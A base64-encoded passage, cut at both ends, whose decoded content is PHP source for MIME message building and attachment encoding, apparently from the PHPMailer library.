Fuc2Zlci1FbmNvZGluZycsICRlbmNvZGluZyk7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOwoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiB0aGUgZW5kIG9mIGEgbWVzc2FnZSBib3VuZGFyeS4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZEJvdW5kYXJ5KCRib3VuZGFyeSkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPkxFIC4gJy0tJyAuICRib3VuZGFyeSAuICctLScgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIG1lc3NhZ2UgdHlwZS4KICAgICAqIFBIUE1haWxlciBvbmx5IHN1cHBvcnRzIHNvbWUgcHJlc2V0IG1lc3NhZ2UgdHlwZXMsIG5vdCBhcmJpdHJhcnkgTUlNRSBzdHJ1Y3R1cmVzLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0TWVzc2FnZVR5cGUoKQogICAgewogICAgICAgICR0eXBlID0gYXJyYXkoKTsKICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdhbHQnOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmlubGluZUltYWdlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdpbmxpbmUnOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmF0dGFjaG1lbnRFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2F0dGFjaCc7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSBpbXBsb2RlKCdfJywgJHR5cGUpOwogICAgICAgIGlmICgkdGhpcy0+bWVzc2FnZV90eXBlID09ICcnKSB7CiAgICAgICAgICAgIC8vVGhlICdwbGFpbicgbWVzc2FnZV90eXBlIHJlZmVycyB0byB0aGUgbWVzc2FnZSBoYXZpbmcgYSBzaW5nbGUgYm9keSBlbGVtZW50LCBub3QgdGhhdCBpdCBpcyBwbGFpbi10ZXh0CiAgICAgICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSAncGxhaW4nOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhIGhlYWRlciBsaW5lLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaGVhZGVyTGluZSgkbmFtZSwgJHZhbHVlKQogICAgewogICAgICAgIHJldHVybiAkbmFtZSAuICc6ICcgLiAkdmFsdWUgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gYSBmb3JtYXR0ZWQgbWFpbCBsaW5lLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdGV4dExpbmUoJHZhbHVlKQogICAgewogICAgICAgIHJldHVybiAkdmFsdWUgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gYXR0YWNobWVudCBmcm9tIGEgcGF0aCBvbiB0aGUgZmlsZXN5c3RlbS4KICAgICAqIE5ldmVyIHVzZSBhIHVzZXItc3VwcGxpZWQgcGF0aCB0byBhIGZpbGUhCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBmaWxlIGNvdWxkIG5vdCBiZSBmb3VuZCBvciByZWFkLgogICAgICogRXhwbGljaXRseSAqZG9lcyBub3QqIHN1cHBvcnQgcGFzc2luZyBVUkxzOyBQSFBNYWlsZXIgaXMgbm90IGFuIEhUVFAgY2xpZW50LgogICAgICogSWYgeW91IG5lZWQgdG8gZG8gdGhhdCwgZmV0Y2ggdGhlIHJlc291cmNlIHlvdXJzZWxmIGFuZCBwYXNzIGl0IGluIHZpYSBhIGxvY2FsIGZpbGUgb3Igc3RyaW5nLgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBQYXRoIHRvIHRoZSBhdHRhY2htZW50LgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQXR0YWNobWVudCgkcGF0aCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JykKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkcGF0aCkgb3IgIUBpc19maWxlKCRwYXRoKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsKICAgICAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7CiAgICAgICAgICAgIGlmICgkbmFtZSA9PSAnJykgewogICAgICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgICAgIDAgPT4gJHBhdGgsCiAgICAgICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgICAgICA1ID0+IGZhbHNlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgNyA9PiAwCiAgICAgICAgICAgICk7CgogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBhcnJheSBvZiBhdHRhY2htZW50cy4KICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEF0dGFjaG1lbnRzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmF0dGFjaG1lbnQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBBdHRhY2ggYWxsIGZpbGUsIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cyB0byB0aGUgbWVzc2FnZS4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb25fdHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhdHRhY2hBbGwoJGRpc3Bvc2l0aW9uX3R5cGUsICRib3VuZGFyeSkKICAgIHsKICAgICAgICAvLyBSZXR1cm4gdGV4dCBvZiBib2R5CiAgICAgICAgJG1pbWUgPSBhcnJheSgpOwogICAgICAgICRjaWRVbmlxID0gYXJyYXkoKTsKICAgICAgICAkaW5jbCA9IGFycmF5KCk7CgogICAgICAgIC8vIEFkZCBhbGwgYXR0YWNobWVudHMKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICAvLyBDaGVjayBpZiBpdCBpcyBhIHZhbGlkIGRpc3Bvc2l0aW9uX2ZpbHRlcgogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJGRpc3Bvc2l0aW9uX3R5cGUpIHsKICAgICAgICAgICAgICAgIC8vIENoZWNrIGZvciBzdHJpbmcgYXR0YWNobWVudAogICAgICAgICAgICAgICAgJHN0cmluZyA9ICcnOwogICAgICAgICAgICAgICAgJHBhdGggPSAnJzsKICAgICAgICAgICAgICAgICRiU3RyaW5nID0gJGF0dGFjaG1lbnRbNV07CiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkc3RyaW5nID0gJGF0dGFjaG1lbnRbMF07CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwYXRoID0gJGF0dGFjaG1lbnRbMF07CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGluY2xoYXNoID0gbWQ1KHNlcmlhbGl6ZSgkYXR0YWNobWVudCkpOwogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRpbmNsaGFzaCwgJGluY2wpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkaW5jbFtdID0gJGluY2xoYXNoOwogICAgICAgICAgICAgICAgJG5hbWUgPSAkYXR0YWNobWVudFsyXTsKICAgICAgICAgICAgICAgICRlbmNvZGluZyA9ICRhdHRhY2htZW50WzNdOwogICAgICAgICAgICAgICAgJHR5cGUgPSAkYXR0YWNobWVudFs0XTsKICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiA9ICRhdHRhY2htZW50WzZdOwogICAgICAgICAgICAgICAgJGNpZCA9ICRhdHRhY2htZW50WzddOwogICAgICAgICAgICAgICAgaWYgKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJyAmJiBhcnJheV9rZXlfZXhpc3RzKCRjaWQsICRjaWRVbmlxKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGNpZFVuaXFbJGNpZF0gPSB0cnVlOwoKICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzJXMnLCAkYm91bmRhcnksICR0aGlzLT5MRSk7CiAgICAgICAgICAgICAgICAvL09ubHkgaW5jbHVkZSBhIGZpbGVuYW1lIHByb3BlcnR5IGlmIHdlIGhhdmUgb25lCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRuYW1lKSkgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlczsgbmFtZT0iJXMiJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSksCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgICAgICAgICBpZiAoJGVuY29kaW5nICE9ICc3Yml0JykgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlcyVzJywgJGVuY29kaW5nLCAkdGhpcy0+TEUpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1JRDogPCVzPiVzJywgJGNpZCwgJHRoaXMtPkxFKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAvLyBJZiBhIGZpbGVuYW1lIGNvbnRhaW5zIGFueSBvZiB0aGVzZSBjaGFycywgaXQgc2hvdWxkIGJlIHF1b3RlZCwKICAgICAgICAgICAgICAgIC8vIGJ1dCBub3Qgb3RoZXJ3aXNlOiBSRkMyMTgzICYgUkZDMjA0NSA1LjEKICAgICAgICAgICAgICAgIC8vIEZpeGVzIGEgd2FybmluZyBpbiBJRVRGJ3MgbXNnbGludCBNSU1FIGNoZWNrZXIKICAgICAgICAgICAgICAgIC8vIEFsbG93IGZvciBieXBhc3NpbmcgdGhlIENvbnRlbnQtRGlzcG9zaXRpb24gaGVhZGVyIHRvdGFsbHkKICAgICAgICAgICAgICAgIGlmICghKGVtcHR5KCRkaXNwb3NpdGlvbikpKSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpOwogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvWyBcKFwpPD5ALDs6XCJcL1xbXF1cPz1dLycsICRlbmNvZGVkX25hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzOyBmaWxlbmFtZT0iJXMiJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRSAuICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGVuY29kZWRfbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9JXMlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkxFIC4gJHRoaXMtPkxFCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUgLiAkdGhpcy0+TEUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgLy8gRW5jb2RlIGFzIHN0cmluZyBhdHRhY2htZW50CiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZVN0cmluZygkc3RyaW5nLCAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMtLSVzJywgJGJvdW5kYXJ5LCAkdGhpcy0+TEUpOwoKICAgICAgICByZXR1cm4gaW1wbG9kZSgnJywgJG1pbWUpOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgZmlsZSBhdHRhY2htZW50IGluIHJlcXVlc3RlZCBmb3JtYXQuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBUaGUgZnVsbCBwYXRoIHRvIHRoZSBmaWxlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBUaGUgZW5jb2RpbmcgdG8gdXNlOyBvbmUgb2YgJ2Jhc2U2NCcsICc3Yml0JywgJzhiaXQnLCAnYmluYXJ5JywgJ3F1b3RlZC1wcmludGFibGUnCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcgPSAnYmFzZTY0JykKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkcGF0aCkgb3IgIWZpbGVfZXhpc3RzKCRwYXRoKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9vcGVuJykgLiAkcGF0aCwgc2VsZjo6U1RPUF9DT05USU5VRSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG1hZ2ljX3F1b3RlcyA9IGZhbHNlOwogICAgICAgICAgICBpZiggdmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNy40LjAnLCAnPCcpICkgewogICAgICAgICAgICAgICAgJG1hZ2ljX3F1b3RlcyA9IGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkbWFnaWNfcXVvdGVzKSB7CiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7CiAgICAgICAgICAgICAgICAgICAgc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKGZhbHNlKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgLy9Eb2Vzbid0IGV4aXN0IGluIFBIUCA1LjQsIGJ1dCB3ZSBkb24ndCBuZWVkIHRvIGNoZWNrIGJlY2F1c2UKICAgICAgICAgICAgICAgICAgICAvL2dldF9tYWdpY19xdW90ZXNfcnVudGltZSBhbHdheXMgcmV0dXJucyBmYWxzZSBpbiA1LjQrCiAgICAgICAgICAgICAgICAgICAgLy9zbyBpdCB3aWxsIG5ldmVyIGdldCBoZXJlCiAgICAgICAgICAgICAgICAgICAgaW5pX3NldCgnbWFnaWNfcXVvdGVzX3J1bnRpbWUnLCBmYWxzZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpbGVfYnVmZmVyID0gZmlsZV9nZXRfY29udGVudHMoJHBhdGgpOwogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCRmaWxlX2J1ZmZlciwgJGVuY29kaW5nKTsKICAgICAgICAgICAgaWYgKCRtYWdpY19xdW90ZXMpIHsKICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcsICc8JykpIHsKICAgICAgICAgICAgICAgICAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoJG1hZ2ljX3F1b3Rlcyk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgJG1hZ2ljX3F1b3Rlcyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICRmaWxlX2J1ZmZlcjsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIHN0cmluZyBpbiByZXF1ZXN0ZWQgZm9ybWF0LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciBUaGUgdGV4dCB0byBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIFRoZSBlbmNvZGluZyB0byB1c2U7IG9uZSBvZiAnYmFzZTY0JywgJzdiaXQnLCAnOGJpdCcsICdiaW5hcnknLCAncXVvdGVkLXByaW50YWJsZScKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlU3RyaW5nKCRzdHIsICRlbmNvZGluZyA9ICdiYXNlNjQnKQogICAgewogICAgICAgICRlbmNvZGVkID0gJyc7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRlbmNvZGluZykpIHsKICAgICAgICAgICAgY2FzZSAnYmFzZTY0JzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZSgkc3RyKSwgNzYsICR0aGlzLT5MRSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnN2JpdCc6CiAgICAgICAgICAgIGNhc2UgJzhiaXQnOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+Zml4RU9MKCRzdHIpOwogICAgICAgICAgICAgICAgLy8gTWFrZSBzdXJlIGl0IGVuZHMgd2l0aCBhIGxpbmUgYnJlYWsKICAgICAgICAgICAgICAgIGlmIChzdWJzdHIoJGVuY29kZWQsIC0oc3RybGVuKCR0aGlzLT5MRSkpKSAhPSAkdGhpcy0+TEUpIHsKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYmluYXJ5JzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHN0cjsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdxdW90ZWQtcHJpbnRhYmxlJzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmVuY29kZVFQKCRzdHIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2VuY29kaW5nJykgLiAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZW5jb2RlZDsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIGhlYWRlciBzdHJpbmcgb3B0aW1hbGx5LgogICAgICogUGlja3Mgc2hvcnRlc3Qgb2YgUSwgQiwgcXVvdGVkLXByaW50YWJsZSBvciBub25lLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICogQHBhcmFtIHN0cmluZyAkcG9zaXRpb24KICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVIZWFkZXIoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKQogICAgewogICAgICAgICRtYXRjaGNvdW50ID0gMDsKICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJHBvc2l0aW9uKSkgewogICAgICAgICAgICBjYXNlICdwaHJhc2UnOgogICAgICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvW8KALcO/XS8nLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgIC8vIENhbid0IHVzZSBhZGRzbGFzaGVzIGFzIHdlIGRvbid0IGtub3cgdGhlIHZhbHVlIG9mIG1hZ2ljX3F1b3Rlc19zeWJhc2UKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGFkZGNzbGFzaGVzKCRzdHIsICIgLi4ff1wiIik7CiAgICAgICAgICAgICAgICAgICAgaWYgKCgkc3RyID09ICRlbmNvZGVkKSAmJiAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkZW5jb2RlZCk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgiXCIkZW5jb2RlZFwiIik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1teICEjLVtdLX5dLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAvKiogQG5vaW5zcGVjdGlvbiBQaHBNaXNzaW5nQnJlYWtTdGF0ZW1lbnRJbnNwZWN0aW9uICovCiAgICAgICAgICAgIGNhc2UgJ2NvbW1lbnQnOgogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1soKSJdLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgIC8vIEludGV